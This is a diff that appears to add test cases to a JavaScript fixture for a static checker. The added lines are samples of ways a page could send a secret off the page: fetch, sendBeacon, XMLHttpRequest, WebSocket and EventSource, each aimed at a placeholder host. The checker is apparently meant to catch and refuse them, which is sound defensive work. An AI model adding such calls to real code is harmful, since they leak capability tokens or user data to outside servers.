@@ -76,6 +76,18 @@ export function sinks(root, el, range, value) {
   const styleEl = document.createElement('style');
   styleEl.textContent = value;
 
+  // Five ways off the page. The link capability lives in the fragment and never
+  // reaches a server on its own; each of these is one line that would change
+  // that, and a beacon in particular returns nothing a caller has to read.
+  fetch('https://example.invalid/', { body: value });
+  navigator.sendBeacon('https://example.invalid/', value);
+  // And a beacon captured rather than called. `sendBeacon` is matched as a
+  // name, so the reference is refused without a call anywhere on the line.
+  const beacon = navigator.sendBeacon;
+  const request = new XMLHttpRequest();
+  const socket = new WebSocket('wss://example.invalid/');
+  const events = new EventSource('https://example.invalid/');
+
   // Not sinks. The three ways to tell the type checker to stop looking, which a
   // whole-configuration pin cannot see because neither configuration changes.
   // @ts-nocheck
